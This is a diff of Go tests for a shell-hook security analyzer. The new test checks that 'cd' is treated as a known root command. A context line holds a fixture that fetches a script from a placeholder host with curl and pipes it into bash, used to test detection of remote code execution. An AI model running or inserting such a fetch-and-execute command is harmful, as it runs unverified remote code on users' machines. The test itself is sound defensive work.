@@ -29,6 +29,19 @@ func TestRemoteContentExecutionRequiresAFlowToShell(t *testing.T) {
 	}
 }
 
+func TestCDIsKnownInRootHooks(t *testing.T) {
+	t.Parallel()
+
+	item := analyzedSDK(t, "cd /tmp\n", sdk.HookSetupBase)
+	findings := finding.AnalyzeSDK(item)
+	if got := findFinding(findings, "risk.unknown-command-root"); got != nil {
+		t.Fatalf("cd was reported as an unknown root command: %#v", got)
+	}
+	if got := findFinding(findings, "assurance.all-commands-known"); got == nil {
+		t.Fatalf("cd did not contribute to known-command assurance: %#v", findings)
+	}
+}
+
 func TestRemoteContentExecutionFollowsSubstitutionAndVariableFlow(t *testing.T) {
 	t.Parallel()
 	item := analyzedSDK(t, "payload=$(curl https://example.invalid/install)\nprintf '%s' \"$payload\" | bash\n", sdk.HookSetupBase)
